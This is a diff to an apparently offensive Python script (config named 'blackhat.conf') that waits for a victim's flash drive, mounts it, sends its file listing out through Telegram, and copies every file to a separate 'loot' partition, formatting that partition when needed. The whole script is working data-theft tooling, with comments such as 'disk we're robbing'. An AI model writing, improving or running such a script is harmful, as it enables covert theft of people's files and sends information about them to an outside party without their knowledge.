@@ -1,6 +1,7 @@
 #!/usr/bin/python
 import time
 import os
+import sys
 from telegram import Telegram
 
 telegram = Telegram("/mnt/blackhat.conf")
@@ -16,31 +17,33 @@ def bash(cmd, sudo=False, suppress_output=False):
 
 
 if __name__ == "__main__":
-    f_name  = "/mnt/data_thief/"  # Where should we extract the data to
-    disk_name = "/dev/sda1"       # Name of disk we're robbing
-    mount_point = "~/media/"
+    TARGET_DISK = "/dev/sda1"     # Name of disk we're robbing
+    LOOT_DISK = "/dev/mmcblk0p3"  # Out disk
+    LOOT_MOUNT_POINT = "/media/loot"
+    TARGET_MOUNT_POINT = "/media/target"
 
-    # Check to see where we're running this
-    system = bash("cat /etc/os-release")
-    if "Buildroot" not in system.split("\n")[0]:
-        f_name = "~/data_thief/"
-        sudo = True
-    else:
-        sudo = False
+    ret = bash(f"lsblk -f {LOOT_DISK}")
+    if "not a block device" in ret:
+        print(f"Partition has not been created: {LOOT_DISK}")
+        sys.exit()
 
-    bash(f"mkdir {f_name}", sudo, suppress_output=True)
-    bash(f"mkdir {mount_point}", sudo, suppress_output=True)
+    if "vfat" not in ret:
+        print(f"Created fat32 fs on {LOOT_DISK}")
+        bash(f"mkfs.vfat -F 32 {LOOT_DISK}")
+
+    bash(f"mkdir {LOOT_MOUNT_POINT}", suppress_output=True)
+    bash(f"mkdir {TARGET_MOUNT_POINT}", suppress_output=True)
 
     retries = 0
     print("Insert Flash Drive")
     while(True):
         time.sleep(1)
-        output = bash(f"file {disk_name}", sudo)
+        output = bash(f"file {TARGET_DISK}")
         if "No such file or directory" in output:
             retries += 1
             if retries > 10:
                 print("No drive, quitting")
-                exit()
+                sys.exit()
             else:
                 print("No drive, retrying")
                 continue
@@ -48,15 +51,18 @@ if __name__ == "__main__":
             print("Mounting")
             break
 
-    bash(f"mount {disk_name} {mount_point}", sudo)
+    bash(f"mount {TARGET_DISK} {TARGET_MOUNT_POINT}")
+    bash(f"mount {LOOT_DISK} {LOOT_MOUNT_POINT}")
+
     print("Disk Mounted...")
     print("Contents...")
-    con = bash(f"ls -1 --color=never {mount_point}")
+    con = bash(f"ls -1 --color=never {TARGET_MOUNT_POINT}")
     print(con)
     telegram.send(f"{con}")
 
     print("Copying Contents")
-    bash(f"cp -r {mount_point}* {f_name}", sudo)
+    bash(f"cp -r {TARGET_MOUNT_POINT}/* {LOOT_MOUNT_POINT}/")
     print("Done")
 
-    bash(f"umount {mount_point}", sudo)
+    bash(f"umount {TARGET_MOUNT_POINT}")
+    bash(f"umount {LOOT_MOUNT_POINT}")
